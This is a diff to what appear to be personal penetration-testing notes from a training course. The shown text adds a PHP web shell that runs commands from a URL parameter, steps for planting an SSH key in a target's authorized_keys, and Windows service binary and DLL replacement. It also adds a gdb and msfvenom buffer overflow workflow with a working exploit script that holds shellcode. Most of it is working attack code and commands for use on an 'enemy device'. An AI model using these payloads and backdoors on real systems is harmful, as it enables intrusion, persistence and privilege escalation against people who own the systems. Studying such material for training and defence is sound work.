@@ -117,22 +117,24 @@ Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER7
     #if you cannot upload the web shell move on it work work
         #if there is no uploads page who the fuck cares
   
-  #Upload this as a php
+    #Upload this as a php
   
-  <HTML><BODY>
-  <FORM METHOD="GET" NAME="myform" ACTION="">
-  <INPUT TYPE="text" NAME="cmd">
-  <INPUT TYPE="submit" VALUE="Send">
-  </FORM>
-  <pre>
-  <?php
-  if($_GET['cmd']) {
-    system($_GET['cmd']);
-    }
-  ?>
-  </pre>
-  </BODY></HTML>
-
+    <HTML><BODY>
+    <FORM METHOD="GET" NAME="myform" ACTION="">
+    <INPUT TYPE="text" NAME="cmd">
+    <INPUT TYPE="submit" VALUE="Send">
+    </FORM>
+    <pre>
+    <?php
+    if($_GET['cmd']) {
+      system($_GET['cmd']);
+      }
+    ?>
+    </pre>
+    </BODY></HTML>
+    
+    #check in /uploads after doing the upload and click the name of it to then go in and do a ssh key upload
+    
 #Once we have creds log into device
     #first thing when on the box
         /bin/bash
@@ -305,6 +307,7 @@ s.close()                           #closes the socket
         #with that we can gain access without the need of a password
     #Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
         ssh-keygen -t rsa
+            #keep everything default, and only upload the .pub never the private
     #After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
         cat ~/.ssh/id_rsa.pub
     #On the target website we need to do some tasks in order to upload our ssh properly
@@ -321,24 +324,115 @@ s.close()                           #closes the socket
                 mkdir /var/www:/.ssh
         #Echo ssh key to the authorized_keys file in the users .ssh folder
             echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+                    #type this out in vim to see the whole thing
                 echo "the shit" >> /var/www:/.ssh/authorized_keys
         #Verify key has been uploaded successfully
             cat /users/home/directory/.ssh/authorized_keys
               cat /var/www:/.ssh/authorized_keys
 
+#Windows Exploitation
+    auditpol /get /category:* | findstr /i "success failure"
+        #for if we need to pull the auditpol information
+            #NEED TO BE A PRIVILEGED USER
+    #persistence
+        #CHECK RUN KEYS
+            #HKLM,HKCU,etc.
+            #actually look at whats in there
+                reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+                          
 
 
+            
+#How to find vulnerable windows executables
+    #CHECK SERVICES FIRST BECAUSE ALL OTHER WAYS REQUIRE PRIVILEDGED ACCOUNTS
+    #Look for blank or obvious descriptions                                                         #Binary Replacement Begins here
+        #once found one peel back the onion
+            #look at the path to executable
+                #using windows gui to find hidden files
+                    #open file explorer
+                    #view
+                    #check file name extensions and hidden files is checked
+                #follow the path listed in services
+                    #right click it and rename
+                    #if you can rename it you can replace it
+                #once found take the exe to replace, name it what the old one was named, and drag it into the location of the file to be replaced
+                    #we are going to be given the file we need, if they give a dll do a dll, if they give an executable then replace the execurable
+                    #restart the machine
+                        #that is it                                                                 #Binary Replacement Ends here                   
+#Dll Hijacking
+    #The exact same process as above however it is a dll now
 
+#Linux Exploit Development
+#Binary Replacement (WILL SEE THIS WHEN RUN THE SUDO -l OR FIND FOR THE SUID/SGID)
+    #scp the program back to your lin ops
+    #run the program, and observe how it takes data
+        #ex input it will ask for you to enter data after run
+        #parameters need the input before ran
+    #try to overload it and cause a seg fault
+        #from three we can build a buffer overflow
+    gdb func
+    pdisass main
+    pdisass <function inside main>
+        #IT IS NOT PRINT F EVEN THO GOOGLE SAYS ITS VULNERABLE
+        #google the shit in red
+    #from here build the exploit
+        #see script written below
+        run <<< $(python lun_buff.py)           #how to run script
+        #from results of original script, and then pull the EIP out of gdb, put into website to get exact number needed
+        #in lin ops
+            env - gdb func
+                show env
+                unset env LINES
+                unset env COLUMNS
+                run
+                #cause overflow with lots of chars
+                infoproc map
+                find /b <first below heap>, <last above stack>, 0xff, 0xe4
+                    #grab a hand ful of addr from result of command
+                    #put in script in reverse byte order
+                msfvenom -p linux/x86/exec CMD="whoami" -b "\00" -f python
+                    #generate shell code to then put in script after adding the addr shit
+                    #from here can runby 
+                    sudo ./func <<< $(python lin_buf.py)
+                        #if no work try regenerating shell code, regen 2-3 times 
+                            #if still not work change nop sled
+                            #if still no work then change eip
+                                #once have working eip don't change the eip again, regen shell code
+                    #ONCE WORKING ON LIN OPS MOVE OVER TO THE ENMEY DEVICE
+                        #can scp or just copy paste
+                            #JUST PUT IT IN /tmp
+                                #YOU WILL HAVE TO CHANGE EIP ON THEIR DEVICE MAY NOT HAVE TO WITH SHELL CODE
 
+#lin_buf.py
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+overflow = <insert the 200 character buffer overflow shit made on the website bookmarked>     #starts as just the 200 chars until we get how many we need exactly
 
+print(offset)
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ change to ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+offset = "A" * 62
+eip = '\xe3\x7e\xf6\xf7'                                                     #get this stuff from env - gdb func
 
+#f7 f6 7e e3
+#0xf7f588ab
+#0xf7f645fb
+#0xf7f6460f
+#0xf7f64aeb
+#0xf7f64aff
+#0xf7f64d6f
 
+#msfvenom -p linux/x86/exec CMD="whoami" -b "\00" -f python
+buf =  b""
+buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
+buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
+buf += b"\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00"
+buf += b"\x57\x53\x89\xe1\xcd\x80"
 
+nop = "\x90" * 15
 
-
+print(offset + eip + nop + buf)
 
 
 
